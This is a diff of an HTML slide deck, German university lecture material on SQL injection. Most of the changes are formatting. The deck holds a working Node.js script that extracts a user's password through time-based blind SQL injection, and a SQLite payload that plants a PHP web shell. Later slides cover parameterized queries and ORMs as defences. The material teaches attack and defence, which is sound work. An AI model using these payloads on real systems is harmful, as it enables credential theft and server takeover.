+<span id="cb31-5"><a href=""></a><span class="kw">const</span> USERNAME <span class="op">=</span> <span class="bu">process</span><span class="op">.</span><span class="at">argv</span>[<span class="dv">2</span>] <span class="op">||</span> <span class="st">'alice'</span></span>
+<span id="cb31-6"><a href=""></a><span class="kw">const</span> TIME_THRESHOLD <span class="op">=</span> <span class="dv">50</span></span>
+<span id="cb31-7"><a href=""></a></span>
+<span id="cb31-8"><a href=""></a><span class="kw">let</span> password <span class="op">=</span> <span class="st">''</span></span>
+<span id="cb31-9"><a href=""></a></span>
+<span id="cb31-10"><a href=""></a><span class="fu">init</span>()</span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
 </section>
 <section id="zeitbasierte-blinde-sql-injection-4" class="slide level2 content-slide code-slide">
 <h2>Zeitbasierte Blinde SQL Injection</h2>
 <h3 id="passwort-mit-brute-force-erraten-1">Passwort mit Brute-Force erraten</h3>
-<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb33"><pre class="sourceCode numberSource js number-lines code-with-copy"><code class="sourceCode javascript"><span id="cb33-1"><a href=""></a><span class="kw">async</span> <span class="kw">function</span> <span class="fu">init</span>() {</span>
-<span id="cb33-2"><a href=""></a>    <span class="bu">process</span><span class="op">.</span><span class="at">stdout</span><span class="op">.</span><span class="fu">write</span>(<span class="st">'Trying'</span>)</span>
-<span id="cb33-3"><a href=""></a>    <span class="kw">let</span> char <span class="op">=</span> CHAR_START</span>
-<span id="cb33-4"><a href=""></a></span>
-<span id="cb33-5"><a href=""></a>    <span class="cf">while</span> (char <span class="op">&lt;=</span> CHAR_END) {</span>
-<span id="cb33-6"><a href=""></a>        <span class="kw">const</span> position <span class="op">=</span> password<span class="op">.</span><span class="at">length</span> <span class="op">+</span> <span class="dv">1</span></span>
-<span id="cb33-7"><a href=""></a>        <span class="kw">const</span> query <span class="op">=</span> <span class="vs">`</span><span class="sc">${</span>USERNAME<span class="sc">}</span><span class="vs">" AND CASE</span></span>
-<span id="cb33-8"><a href=""></a><span class="vs">            SUBSTR(password,</span><span class="sc">${</span>position<span class="sc">}</span><span class="vs">,1) WHEN CHAR(</span><span class="sc">${</span>char<span class="sc">}</span><span class="vs">) THEN</span></span>
-<span id="cb33-9"><a href=""></a><span class="vs">            123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000000/2))))</span></span>
-<span id="cb33-10"><a href=""></a><span class="vs">            ELSE null END --`</span></span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
+<p><br></p>
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb32"><pre class="sourceCode numberSource js number-lines code-with-copy"><code class="sourceCode javascript"><span id="cb32-1"><a href=""></a><span class="kw">async</span> <span class="kw">function</span> <span class="fu">init</span>() {</span>
+<span id="cb32-2"><a href=""></a>    <span class="bu">process</span><span class="op">.</span><span class="at">stdout</span><span class="op">.</span><span class="fu">write</span>(<span class="st">'Trying'</span>)</span>
+<span id="cb32-3"><a href=""></a>    <span class="kw">let</span> char <span class="op">=</span> CHAR_START</span>
+<span id="cb32-4"><a href=""></a></span>
+<span id="cb32-5"><a href=""></a>    <span class="cf">while</span> (char <span class="op">&lt;=</span> CHAR_END) {</span>
+<span id="cb32-6"><a href=""></a>        <span class="kw">const</span> position <span class="op">=</span> password<span class="op">.</span><span class="at">length</span> <span class="op">+</span> <span class="dv">1</span></span>
+<span id="cb32-7"><a href=""></a>        <span class="kw">const</span> query <span class="op">=</span> <span class="vs">`</span><span class="sc">${</span>USERNAME<span class="sc">}</span><span class="vs">" AND CASE</span></span>
+<span id="cb32-8"><a href=""></a><span class="vs">            SUBSTR(password,</span><span class="sc">${</span>position<span class="sc">}</span><span class="vs">,1) WHEN CHAR(</span><span class="sc">${</span>char<span class="sc">}</span><span class="vs">) THEN</span></span>
+<span id="cb32-9"><a href=""></a><span class="vs">            123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000000/2))))</span></span>
+<span id="cb32-10"><a href=""></a><span class="vs">            ELSE null END --`</span></span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
 </section>
 <section id="zeitbasierte-blinde-sql-injection-5" class="slide level2 content-slide code-slide">
 <h2>Zeitbasierte Blinde SQL Injection</h2>
 <h3 id="passwort-mit-brute-force-erraten-2">Passwort mit Brute-Force erraten</h3>
-<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb34"><pre class="sourceCode numberSource js number-lines code-with-copy"><code class="sourceCode javascript"><span id="cb34-1"><a href=""></a>        <span class="kw">const</span> time <span class="op">=</span> <span class="cf">await</span> <span class="fu">getResultWithTime</span>(() <span class="kw">=&gt;</span> {</span>
-<span id="cb34-2"><a href=""></a>            <span class="cf">return</span> <span class="fu">got</span>(URL<span class="op">,</span> {</span>
-<span id="cb34-3"><a href=""></a>                <span class="dt">form</span><span class="op">:</span> <span class="kw">true</span><span class="op">,</span></span>
-<span id="cb34-4"><a href=""></a>                <span class="dt">body</span><span class="op">:</span> {</span>
-<span id="cb34-5"><a href=""></a>                    <span class="dt">username</span><span class="op">:</span> query<span class="op">,</span></span>
-<span id="cb34-6"><a href=""></a>                    <span class="dt">password</span><span class="op">:</span> <span class="st">''</span></span>
-<span id="cb34-7"><a href=""></a>                }</span>
-<span id="cb34-8"><a href=""></a>            })</span>
-<span id="cb34-9"><a href=""></a>        })</span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
+<p><br></p>
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb33"><pre class="sourceCode numberSource js number-lines code-with-copy"><code class="sourceCode javascript"><span id="cb33-1"><a href=""></a>        <span class="kw">const</span> time <span class="op">=</span> <span class="cf">await</span> <span class="fu">getResultWithTime</span>(() <span class="kw">=&gt;</span> {</span>
+<span id="cb33-2"><a href=""></a>            <span class="cf">return</span> <span class="fu">got</span>(URL<span class="op">,</span> {</span>
+<span id="cb33-3"><a href=""></a>                <span class="dt">form</span><span class="op">:</span> <span class="kw">true</span><span class="op">,</span></span>
+<span id="cb33-4"><a href=""></a>                <span class="dt">body</span><span class="op">:</span> {</span>
+<span id="cb33-5"><a href=""></a>                    <span class="dt">username</span><span class="op">:</span> query<span class="op">,</span></span>
+<span id="cb33-6"><a href=""></a>                    <span class="dt">password</span><span class="op">:</span> <span class="st">''</span></span>
+<span id="cb33-7"><a href=""></a>                }</span>
+<span id="cb33-8"><a href=""></a>            })</span>
+<span id="cb33-9"><a href=""></a>        })</span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
 </section>
 <section id="zeitbasierte-blinde-sql-injection-6" class="slide level2 content-slide code-slide">
 <h2>Zeitbasierte Blinde SQL Injection</h2>
 <h3 id="passwort-mit-brute-force-erraten-3">Passwort mit Brute-Force erraten</h3>
-<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb35"><pre class="sourceCode numberSource js number-lines code-with-copy"><code class="sourceCode javascript"><span id="cb35-1"><a href=""></a>        <span class="bu">process</span><span class="op">.</span><span class="at">stdout</span><span class="op">.</span><span class="fu">write</span>(<span class="bu">String</span><span class="op">.</span><span class="fu">fromCharCode</span>(char))</span>
-<span id="cb35-2"><a href=""></a>        <span class="cf">if</span> (time <span class="op">&gt;</span> TIME_THRESHOLD) {</span>
-<span id="cb35-3"><a href=""></a>            password <span class="op">+=</span> <span class="bu">String</span><span class="op">.</span><span class="fu">fromCharCode</span>(char)</span>
-<span id="cb35-4"><a href=""></a>            <span class="bu">console</span><span class="op">.</span><span class="fu">log</span>(<span class="st">' MATCH!'</span>)</span>
-<span id="cb35-5"><a href=""></a>            <span class="bu">console</span><span class="op">.</span><span class="fu">log</span>(<span class="vs">` Password: </span><span class="sc">${</span>password<span class="sc">}</span><span class="vs">`</span>)</span>
-<span id="cb35-6"><a href=""></a>            char <span class="op">=</span> CHAR_START</span>
-<span id="cb35-7"><a href=""></a>            <span class="bu">process</span><span class="op">.</span><span class="at">stdout</span><span class="op">.</span><span class="fu">write</span>(<span class="st">'Trying'</span>)</span>
-<span id="cb35-8"><a href=""></a>        } <span class="cf">else</span> {</span>
-<span id="cb35-9"><a href=""></a>            char <span class="op">+=</span> <span class="dv">1</span></span>
-<span id="cb35-10"><a href=""></a>        }</span>
-<span id="cb35-11"><a href=""></a>    }</span>
-<span id="cb35-12"><a href=""></a>    <span class="bu">console</span><span class="op">.</span><span class="fu">log</span>(<span class="vs">`</span><span class="sc">\n\n</span><span class="vs">DONE. Password: </span><span class="sc">${</span>password<span class="sc">}</span><span class="vs">`</span>)</span>
-<span id="cb35-13"><a href=""></a>}</span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
+<p><br></p>
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb34"><pre class="sourceCode numberSource js number-lines code-with-copy"><code class="sourceCode javascript"><span id="cb34-1"><a href=""></a>        <span class="bu">process</span><span class="op">.</span><span class="at">stdout</span><span class="op">.</span><span class="fu">write</span>(<span class="bu">String</span><span class="op">.</span><span class="fu">fromCharCode</span>(char))</span>
+<span id="cb34-2"><a href=""></a>        <span class="cf">if</span> (time <span class="op">&gt;</span> TIME_THRESHOLD) {</span>
+<span id="cb34-3"><a href=""></a>            password <span class="op">+=</span> <span class="bu">String</span><span class="op">.</span><span class="fu">fromCharCode</span>(char)</span>
+<span id="cb34-4"><a href=""></a>            <span class="bu">console</span><span class="op">.</span><span class="fu">log</span>(<span class="st">' MATCH!'</span>)</span>
+<span id="cb34-5"><a href=""></a>            <span class="bu">console</span><span class="op">.</span><span class="fu">log</span>(<span class="vs">` Password: </span><span class="sc">${</span>password<span class="sc">}</span><span class="vs">`</span>)</span>
+<span id="cb34-6"><a href=""></a>            char <span class="op">=</span> CHAR_START</span>
+<span id="cb34-7"><a href=""></a>            <span class="bu">process</span><span class="op">.</span><span class="at">stdout</span><span class="op">.</span><span class="fu">write</span>(<span class="st">'Trying'</span>)</span>
+<span id="cb34-8"><a href=""></a>        } <span class="cf">else</span> {</span>
+<span id="cb34-9"><a href=""></a>            char <span class="op">+=</span> <span class="dv">1</span></span>
+<span id="cb34-10"><a href=""></a>        }</span>
+<span id="cb34-11"><a href=""></a>    }</span>
+<span id="cb34-12"><a href=""></a>    <span class="bu">console</span><span class="op">.</span><span class="fu">log</span>(<span class="vs">`</span><span class="sc">\n\n</span><span class="vs">DONE. Password: </span><span class="sc">${</span>password<span class="sc">}</span><span class="vs">`</span>)</span>
+<span id="cb34-13"><a href=""></a>}</span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
 </section>
 <section id="zeitbasierte-blinde-sql-injection-7" class="slide level2 content-slide code-slide">
 <h2>Zeitbasierte Blinde SQL Injection</h2>
 <h3 id="passwort-mit-brute-force-erraten-4">Passwort mit Brute-Force erraten</h3>
-<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb36"><pre class="sourceCode numberSource js number-lines code-with-copy"><code class="sourceCode javascript"><span id="cb36-1"><a href=""></a><span class="kw">async</span> <span class="kw">function</span> <span class="fu">getResultWithTime</span>(createPromise) {</span>
-<span id="cb36-2"><a href=""></a>    <span class="kw">const</span> startTime <span class="op">=</span> <span class="bu">Date</span><span class="op">.</span><span class="fu">now</span>()</span>
-<span id="cb36-3"><a href=""></a>    <span class="cf">await</span> <span class="fu">createPromise</span>()</span>
-<span id="cb36-4"><a href=""></a>    <span class="cf">return</span> <span class="bu">Date</span><span class="op">.</span><span class="fu">now</span>() <span class="op">-</span> startTime</span>
-<span id="cb36-5"><a href=""></a>}</span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
+<p><br></p>
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb35"><pre class="sourceCode numberSource js number-lines code-with-copy"><code class="sourceCode javascript"><span id="cb35-1"><a href=""></a><span class="kw">async</span> <span class="kw">function</span> <span class="fu">getResultWithTime</span>(createPromise) {</span>
+<span id="cb35-2"><a href=""></a>    <span class="kw">const</span> startTime <span class="op">=</span> <span class="bu">Date</span><span class="op">.</span><span class="fu">now</span>()</span>
+<span id="cb35-3"><a href=""></a>    <span class="cf">await</span> <span class="fu">createPromise</span>()</span>
+<span id="cb35-4"><a href=""></a>    <span class="cf">return</span> <span class="bu">Date</span><span class="op">.</span><span class="fu">now</span>() <span class="op">-</span> startTime</span>
+<span id="cb35-5"><a href=""></a>}</span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
 </section>
 <section id="anwendungsrechte" class="slide level2 content-slide pdf-slide">
 <h2>Anwendungsrechte</h2>
+<p><br></p>
 <ul>
 <li>Normale Nutzer und Administratoren nutzen die gleichen Pfade und Funktionen, um mit der Datenbank zu interagieren.</li>
 <li>Der Webserver bearbeitet alle Kontrollentscheidungen.
@@ -564,6 +645,7 @@ HTW Dresden<br>
 </section>
 <section id="remote-code-execution" class="slide level2 content-slide pdf-slide">
 <h2>Remote Code Execution</h2>
+<p><br></p>
 <ul>
 <li>Datenbank-Server ermöglichen oft, beliebige Shell-Befehle auszuführen.</li>
 <li>Microsoft SQL Server hat den Befehl <code>xp_cmdshell</code>, um eine Shell zu öffnen und den übergebenen Befehl auszuführen.
@@ -575,19 +657,21 @@ HTW Dresden<br>
 </section>
 <section id="remote-code-execution-mit-sqlite" class="slide level2 content-slide code-slide">
 <h2>Remote Code Execution mit SQLite</h2>
+<p><br></p>
 <ul>
 <li>SQLite kann keine Shell-Befehle direkt ausführen, ermöglicht aber das Erstellen neuer Datenbanken.</li>
 </ul>
-<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb37"><pre class="sourceCode numberSource sql number-lines code-with-copy"><code class="sourceCode sql"><span id="cb37-1"><a href=""></a>ATTACH <span class="kw">DATABASE</span> <span class="st">'/var/www/lol.php'</span> <span class="kw">AS</span> lol;</span>
-<span id="cb37-2"><a href=""></a><span class="kw">CREATE</span> <span class="kw">TABLE</span> lol.pwn (dataz text);</span>
-<span id="cb37-3"><a href=""></a><span class="kw">INSERT</span> <span class="kw">INTO</span> lol.pwn (dataz)</span>
-<span id="cb37-4"><a href=""></a><span class="kw">VALUES</span> (<span class="st">'&lt;system($_GET["cmd"]); &gt;'</span>); <span class="co">--</span></span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb36"><pre class="sourceCode numberSource sql number-lines code-with-copy"><code class="sourceCode sql"><span id="cb36-1"><a href=""></a>ATTACH <span class="kw">DATABASE</span> <span class="st">'/var/www/lol.php'</span> <span class="kw">AS</span> lol;</span>
+<span id="cb36-2"><a href=""></a><span class="kw">CREATE</span> <span class="kw">TABLE</span> lol.pwn (dataz text);</span>
+<span id="cb36-3"><a href=""></a><span class="kw">INSERT</span> <span class="kw">INTO</span> lol.pwn (dataz)</span>
+<span id="cb36-4"><a href=""></a><span class="kw">VALUES</span> (<span class="st">'&lt;system($_GET["cmd"]); &gt;'</span>); <span class="co">--</span></span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
 <ul>
 <li>Kann genutzt werden, um eine Quellcode-Datei zu erstellen, die beim Abruf ausgeführt wird.</li>
 </ul>
 </section>
 <section id="schutz" class="slide level2 content-slide pdf-slide">
 <h2>Schutz</h2>
+<p><br></p>
 <ul>
 <li><strong>Niemals SQL Queries aus Nutzereingaben mit String-Konkatenation erstellen.</strong></li>
 <li>Stattdessen eine der folgenden Methoden nutzen:
@@ -599,51 +683,96 @@ HTW Dresden<br>
 </section>
 <section id="parameterisiertes-sql" class="slide level2 content-slide code-slide">
 <h2>Parameterisiertes SQL</h2>
-<h4 id="verwundbarer-code-2">Verwundbarer Code</h4>
-<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb38"><pre class="sourceCode numberSource js number-lines code-with-copy"><code class="sourceCode javascript"><span id="cb38-1"><a href=""></a><span class="kw">const</span> query <span class="op">=</span> <span class="vs">`SELECT * FROM users WHERE username = "</span><span class="sc">${</span>username<span class="sc">}</span><span class="vs">"`</span></span>
-<span id="cb38-2"><a href=""></a><span class="kw">const</span> results <span class="op">=</span> db<span class="op">.</span><span class="fu">all</span>(query)</span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
-<h4 id="sicherer-code">Sicherer Code</h4>
-<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb39"><pre class="sourceCode numberSource js number-lines code-with-copy"><code class="sourceCode javascript"><span id="cb39-1"><a href=""></a><span class="kw">const</span> query <span class="op">=</span> <span class="st">'SELECT * FROM users WHERE username = '</span></span>
-<span id="cb39-2"><a href=""></a><span class="kw">const</span> results <span class="op">=</span> db<span class="op">.</span><span class="fu">all</span>(query<span class="op">,</span> username)</span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
+<p><br></p>
+<div title="Verwundbarer Code">
+<div class="callout callout-important callout-titled callout-style-default">
+<div class="callout-body">
+<div class="callout-title">
+<div class="callout-icon-container">
+<i class="callout-icon"></i>
+</div>
+<p><strong>Verwundbarer Code</strong></p>
+</div>
+<div class="callout-content">
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb37"><pre class="sourceCode numberSource js number-lines code-with-copy"><code class="sourceCode javascript"><span id="cb37-1"><a href=""></a>    <span class="kw">const</span> query <span class="op">=</span> <span class="vs">`SELECT * FROM users WHERE username = "</span><span class="sc">${</span>username<span class="sc">}</span><span class="vs">"`</span></span>
+<span id="cb37-2"><a href=""></a>    <span class="kw">const</span> results <span class="op">=</span> db<span class="op">.</span><span class="fu">all</span>(query)</span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
+</div>
+</div>
+</div>
+</div>
+<div title="Sicherer Code">
+<div class="callout callout-tip callout-titled callout-style-default">
+<div class="callout-body">
+<div class="callout-title">
+<div class="callout-icon-container">
+<i class="callout-icon"></i>
+</div>
+<p><strong>Sicherer Code</strong></p>
+</div>
+<div class="callout-content">
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb38"><pre class="sourceCode numberSource js number-lines code-with-copy"><code class="sourceCode javascript"><span id="cb38-1"><a href=""></a>    <span class="kw">const</span> query <span class="op">=</span> <span class="st">'SELECT * FROM users WHERE username = '</span></span>
+<span id="cb38-2"><a href=""></a>    <span class="kw">const</span> results <span class="op">=</span> db<span class="op">.</span><span class="fu">all</span>(query<span class="op">,</span> username)</span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
+</div>
+</div>
+</div>
+</div>
 <ul>
 <li>Escapted automatisch nicht vertrauenswürdigen Input</li>
 </ul>
 </section>
 <section id="object-relational-mapping" class="slide level2 content-slide code-slide">
 <h2>Object Relational Mapping</h2>
+<p><br></p>
 <ul>
 <li>ORMs abstrahieren die Datenbank in Objekte der entsprechenden Programmiersprache</li>
 <li>Kümmert sich automatisch um Escaping und ähnliches</li>
 </ul>
-<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb40"><pre class="sourceCode numberSource js number-lines code-with-copy"><code class="sourceCode javascript"><span id="cb40-1"><a href=""></a><span class="kw">class</span> User <span class="kw">extends</span> Model {</span>
-<span id="cb40-2"><a href=""></a>    <span class="kw">static</span> tableName <span class="op">=</span> <span class="st">'users'</span></span>
-<span id="cb40-3"><a href=""></a>}</span>
-<span id="cb40-4"><a href=""></a></span>
-<span id="cb40-5"><a href=""></a><span class="kw">const</span> user <span class="op">=</span> <span class="cf">await</span> User<span class="op">.</span><span class="fu">query</span>()</span>
-<span id="cb40-6"><a href=""></a>    <span class="op">.</span><span class="fu">where</span>(<span class="st">'username'</span><span class="op">,</span> username)</span>
-<span id="cb40-7"><a href=""></a>    <span class="op">.</span><span class="fu">where</span>(<span class="st">'password'</span><span class="op">,</span> password)</span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb39"><pre class="sourceCode numberSource js number-lines code-with-copy"><code class="sourceCode javascript"><span id="cb39-1"><a href=""></a><span class="kw">class</span> User <span class="kw">extends</span> Model {</span>
+<span id="cb39-2"><a href=""></a>    <span class="kw">static</span> tableName <span class="op">=</span> <span class="st">'users'</span></span>
+<span id="cb39-3"><a href=""></a>}</span>
+<span id="cb39-4"><a href=""></a></span>
+<span id="cb39-5"><a href=""></a><span class="kw">const</span> user <span class="op">=</span> <span class="cf">await</span> User<span class="op">.</span><span class="fu">query</span>()</span>
+<span id="cb39-6"><a href=""></a>    <span class="op">.</span><span class="fu">where</span>(<span class="st">'username'</span><span class="op">,</span> username)</span>
+<span id="cb39-7"><a href=""></a>    <span class="op">.</span><span class="fu">where</span>(<span class="st">'password'</span><span class="op">,</span> password)</span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
 </section>
 <section id="zusammenfassung" class="slide level2 content-slide pdf-slide">
 <h2>Zusammenfassung</h2>
+<p><br></p>
 <p>✓ SQL-Injection-Angriffe erkennen und erklären</p>
 <p>✓ klassische, blinde und zeitbasierte SQL Injection unterscheiden</p>
 <p>✓ verwundbaren Code identifizieren</p>
 <p>✓ Schutzmaßnahmen anwenden: parameterisiertes SQL und ORM</p>
-<p><strong>Kernbotschaft:</strong> Niemals SQL Queries durch String-Konkatenation erstellen. Immer parameterisiertes SQL oder ORMs verwenden.</p>
+<p><br></p>
+<div title="Kernbotschaft">
+<div class="callout callout-important callout-titled callout-style-default">
+<div class="callout-body">
+<div class="callout-title">
+<div class="callout-icon-container">
+<i class="callout-icon"></i>
+</div>
+<p><strong>Kernbotschaft</strong></p>
+</div>
+<div class="callout-content">
+<p>Niemals SQL Queries durch String-Konkatenation erstellen.<br>
+Immer parameterisiertes SQL oder ORMs verwenden.</p>
+</div>
+</div>
+</div>
+</div>
 </section>
 <section id="vielen-dank" class="slide level2 title-slide center" data-state="hide-footer">
 <h2>Vielen Dank!</h2>
 <p><img class="title-image" src="../../images/datenschutz.jpg" alt="" style="--title-image-width: 120vw; --title-image-right: -500px; --title-image-top: 0px; --title-image-height: 100vh; --title-image-object-position: right right;"> SQL Injection</p>
 <p>Prof.&nbsp;Dr.&nbsp;Lukas Iffländer<br>
 HTW Dresden<br>
-30.06.2026</p>
+30.07.2026</p>
 
 </section>
     </div>
   <div class="quarto-auto-generated-content" style="display: none;">
 <p><img src="../../logos/htw-logo-small.jpg" class="slide-logo"></p>
 <div class="footer footer-default">
-<p>30.06.2026 / SQL Injection / HTW Dresden / Prof.&nbsp;Dr.&nbsp;Lukas Iffländer</p>
+<p>30.07.2026 / SQL Injection / HTW Dresden / Prof.&nbsp;Dr.&nbsp;Lukas Iffländer</p>
 </div>
 </div></div>
 
